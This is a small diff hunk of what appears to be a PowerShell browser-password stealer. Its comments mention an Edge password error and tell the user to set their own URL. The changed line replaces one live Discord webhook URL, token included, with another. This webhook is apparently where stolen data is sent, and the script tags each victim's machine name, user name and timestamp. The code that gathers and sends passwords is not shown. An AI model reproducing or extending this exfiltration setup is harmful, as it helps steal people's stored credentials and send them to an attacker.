@@ -5,7 +5,7 @@
 # Correct the Edge password error
 
 #CHANGE URL TO YOUR URL
-  $url="https://discordapp.com/api/webhooks/1276939414802661416/CtTz1AtVvnChDRmgjQXY_uFh1763abx3cSbWIPeYfXCppzk8kM62IlxaTPIF6T6Y88on" ;
+  $url="https://discordapp.com/api/webhooks/1276939414802661416/CtTddz1AtVvnChDRmgjQXY_uFh1763abx3cSbWIPeYfXCppzk8kM62IlxaTPIF6T6Y88on" ;
 #Get PC Name+Date+Time
   $namepc = Get-Date -UFormat "$env:computername-$env:UserName-%m-%d-%Y_%H-%M-%S"
 
